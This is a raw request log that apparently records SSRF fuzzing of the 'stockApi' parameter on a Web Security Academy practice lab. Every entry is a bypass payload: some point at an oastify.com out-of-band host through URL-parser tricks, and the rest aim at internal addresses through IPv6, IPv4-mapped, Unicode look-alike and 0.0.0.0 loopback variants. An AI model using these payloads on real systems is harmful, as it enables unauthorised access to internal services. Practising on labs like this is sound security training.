[2025-03-26T07:24:09.749247] method=POST param='stockApi' → https://	bcrozxku48s9zpbn1hp75dqft6zxnobd.oastify.com/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:24:10.994624] method=POST param='stockApi' → https://@bcrozxku48s9zpbn1hp75dqft6zxnobd.oastify.com/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:24:11.329672] method=POST param='stockApi' → https://///bcrozxku48s9zpbn1hp75dqft6zxnobd.oastify.com/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:24:11.685937] method=POST param='stockApi' → https:////bcrozxku48s9zpbn1hp75dqft6zxnobd.oastify.com/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:24:12.020495] method=POST param='stockApi' → https:///\bcrozxku48s9zpbn1hp75dqft6zxnobd.oastify.com/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:24:12.330624] method=POST param='stockApi' → https:///&bsol;/bcrozxku48s9zpbn1hp75dqft6zxnobd.oastify.com/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:24:12.682780] method=POST param='stockApi' → https:///&NewLine;/bcrozxku48s9zpbn1hp75dqft6zxnobd.oastify.com/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:28:14.176379] method=POST param='stockApi' → https://[::]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:28:15.404304] method=POST param='stockApi' → https://[::1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:28:15.722929] method=POST param='stockApi' → https://[::ffff:0.0.0.0]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:28:16.073188] method=POST param='stockApi' → https://[::ffff:0000:0000]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:28:16.516042] method=POST param='stockApi' → https://[::ffff:7f00:1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:28:16.933789] method=POST param='stockApi' → https://[::ﬀﬀ:7f00:1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:28:17.283147] method=POST param='stockApi' → https://[0:0:0:0:0:ffff:127.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:28:17.643160] method=POST param='stockApi' → https://[0:0:0:0:0:ffff:1㉗.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:28:17.985481] method=POST param='stockApi' → https://[0:0:0:0:0:ffff:⑫7.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:28:18.330580] method=POST param='stockApi' → https://[0:0:0:0:0:ﬀﬀ:127.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:28:18.715280] method=POST param='stockApi' → https://[0000::1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:28:19.017773] method=POST param='stockApi' → https://[0000:0000:0000:0000:0000:0000:0000:0000]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:28:19.363133] method=POST param='stockApi' → https://[0000:0000:0000:0000:0000:0000:0000:0001]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:28:19.687249] method=POST param='stockApi' → https://@0/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:28:20.029045] method=POST param='stockApi' → https://\l\o\c\a\l\h\o\s\t/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:28:20.368219] method=POST param='stockApi' → https://stock.weliketoshop.net.local/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:28:20.713847] method=POST param='stockApi' → https://stock.weliketoshop.net.localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:28:21.057038] method=POST param='stockApi' → https://0/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:28:21.401251] method=POST param='stockApi' → https://0:80/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:28:21.747127] method=POST param='stockApi' → https://0.0.0.0/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T07:28:22.049685] method=POST param='stockApi' → https://0000.0000.0000.0000/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
